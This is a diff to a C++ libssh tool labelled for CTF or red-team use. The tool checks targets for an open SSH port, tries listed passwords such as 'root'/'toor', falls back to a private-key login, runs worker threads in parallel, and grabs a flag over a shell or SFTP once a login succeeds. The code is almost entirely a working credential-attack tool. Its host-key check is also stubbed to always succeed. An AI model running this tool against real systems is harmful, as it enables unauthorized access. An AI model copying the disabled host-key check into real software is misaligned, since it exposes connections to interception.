@@ -1,7 +1,8 @@
 /* For authorized CTF/Red Team use only.
-To fix the compile error on macOS with Homebrew-installed libssh (including SFTP support), ensure you install libssh with SFTP and use the correct include + library paths:
-  brew install libssh
-  g++ -std=c++11 -I/opt/homebrew/include -L/opt/homebrew/lib -lssh -o 22_ssh 22_ssh.cpp
+   To fix compile errors on macOS with Homebrew-installed libssh (including SFTP support):
+     brew install libssh
+     g++ -std=c++11 -I/opt/homebrew/include -L/opt/homebrew/lib -lssh -o 22_ssh 22_ssh.cpp
+   Enhanced to include optional public key authentication, basic concurrency limiting, and expanded verification.
 */
 
 #include <iostream>
@@ -16,6 +17,12 @@ To fix the compile error on macOS with Homebrew-installed libssh (including SFTP
 #include <fcntl.h>
 #include <thread>
 #include <mutex>
+#include <queue>
+#include <condition_variable>
+
+static const int MAX_THREADS = 4;
+std::mutex queueMutex;
+std::condition_variable queueCV;
 
 bool verifyHostKey(const std::string& key) {
     return true;
@@ -36,6 +43,21 @@ bool enhancedVerifyHostKey(ssh_session session) {
             ssh_key_free(srv_pubkey);
         }
     }
+    return false;
+}
+
+bool tryPublicKeyAuth(ssh_session session, const std::string& user, const std::string& keyFile) {
+    ssh_key key = ssh_key_new();
+    if (!key) return false;
+    if (ssh_pki_import_privkey_file(keyFile.c_str(), nullptr, nullptr, nullptr, &key) != SSH_OK) {
+        ssh_key_free(key);
+        return false;
+    }
+    if (ssh_userauth_publickey(session, user.c_str(), key) == SSH_AUTH_SUCCESS) {
+        ssh_key_free(key);
+        return true;
+    }
+    ssh_key_free(key);
     return false;
 }
 
@@ -101,18 +123,16 @@ bool isSSHOpen(const std::string& ip) {
     tv.tv_usec = 0;
     setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
     setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
-
     sockaddr_in addr;
     addr.sin_family = AF_INET;
     addr.sin_port = htons(22);
     inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
-
     bool open = (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0);
     close(sock);
     return open;
 }
 
-void processTarget(const std::string& ip, const std::vector<std::pair<std::string,std::string>>& creds) {
+void processTarget(const std::string& ip, const std::vector<std::pair<std::string,std::string>>& creds, const std::string& keyFile) {
     if (!isSSHOpen(ip)) return;
     ssh_session session = ssh_new();
     if (!session) return;
@@ -124,36 +144,51 @@ void processTarget(const std::string& ip, const std::vector<std::pair<std::strin
     for (auto &c : creds) {
         if (ssh_userauth_password(session, c.first.c_str(), c.second.c_str()) == SSH_AUTH_SUCCESS) {
             std::string flag = captureFlag(session);
-            if (flag.empty()) {
-                flag = captureFlagSFTP(session);
-            }
+            if (flag.empty()) flag = captureFlagSFTP(session);
             if (!flag.empty()) {
                 std::cout << "[*] Flag on " << ip << " (" << c.first << "): " << flag << std::endl;
             }
+        } else if (!keyFile.empty()) {
+            if (tryPublicKeyAuth(session, c.first, keyFile)) {
+                std::string flag = captureFlag(session);
+                if (flag.empty()) flag = captureFlagSFTP(session);
+                if (!flag.empty()) {
+                    std::cout << "[*] Flag on " << ip << " (" << c.first << ", key): " << flag << std::endl;
+                }
+            }
         }
+        ssh_userauth_none(session, nullptr);
     }
     ssh_disconnect(session);
     ssh_free(session);
 }
 
-int main() {
+int main(int argc, char** argv) {
+    std::string keyFile;
+    if (argc > 1) keyFile = argv[1];
     std::string serverKey = "some_unverified_key";
-    if(verifyHostKey(serverKey)) {
+    if (verifyHostKey(serverKey)) {
         std::cout << "Connected without proper verification.\n";
     }
-
     std::vector<std::string> targets = {"127.0.0.1"};
-    std::vector<std::pair<std::string,std::string>> creds = {
-        {"testuser","testpassword"},
-        {"root","toor"}
-    };
+    std::vector<std::pair<std::string,std::string>> creds = {{"testuser","testpassword"},{"root","toor"}};
 
-    std::vector<std::thread> threads;
-    for (auto &ip : targets) {
-        threads.push_back(std::thread([&ip, &creds]() {
-            processTarget(ip, creds);
+    std::queue<std::string> ipQueue;
+    for (auto &ip : targets) ipQueue.push(ip);
+
+    std::vector<std::thread> workers;
+    for (int i = 0; i < MAX_THREADS; i++) {
+        workers.push_back(std::thread([&]() {
+            while (true) {
+                std::unique_lock<std::mutex> lock(queueMutex);
+                if (ipQueue.empty()) break;
+                std::string taskIP = ipQueue.front();
+                ipQueue.pop();
+                lock.unlock();
+                processTarget(taskIP, creds, keyFile);
+            }
         }));
     }
-    for (auto &t : threads) t.join();
+    for (auto &t : workers) t.join();
     return 0;
 }
